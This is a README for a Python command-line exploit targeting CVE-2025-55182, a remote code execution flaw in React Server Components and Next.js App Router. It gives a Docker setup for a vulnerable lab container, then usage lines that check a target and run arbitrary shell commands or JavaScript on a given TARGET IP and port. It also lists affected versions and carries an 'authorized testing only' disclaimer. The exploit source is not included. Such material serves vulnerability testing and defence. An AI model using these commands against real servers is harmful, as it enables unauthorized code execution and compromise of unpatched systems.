# CVE-2025-55182 - React Server Components RCE Exploit

Python CLI exploit for CVE-2025-55182, a critical RCE vulnerability in React Server Components via `react-server-dom-webpack`.

**Based on:** [ejpir/CVE-2025-55182-poc](https://github.com/ejpir/CVE-2025-55182-poc)

## Quick Start

### Docker Testing

```bash
# Build and run vulnerable container
docker build -t cve-2025-55182-vuln .
docker run -d -p 3002:3002 --name cve-2025-55182 cve-2025-55182-vuln
sleep 3

# Check vulnerability
python3 exploit.py CVE-2025-55182 --ip localhost --port 3002 --check

# Execute commands
python3 exploit.py CVE-2025-55182 --ip localhost --port 3002 --cmd "id"
python3 exploit.py CVE-2025-55182 --ip localhost --port 3002 --cmd "whoami"

# Cleanup
docker stop cve-2025-55182 && docker rm cve-2025-55182
```

## Usage

```bash
# Check vulnerability
python3 exploit.py CVE-2025-55182 --ip TARGET --port 3002 --check

# Execute command
python3 exploit.py CVE-2025-55182 --ip TARGET --port 3002 --cmd "COMMAND"

# Execute JavaScript
python3 exploit.py CVE-2025-55182 --url http://TARGET:3002 --code "Math.PI * 2"
```

## Affected Versions

- `react-server-dom-webpack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `Next.js`: 15.x, 16.x (App Router)

## Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**
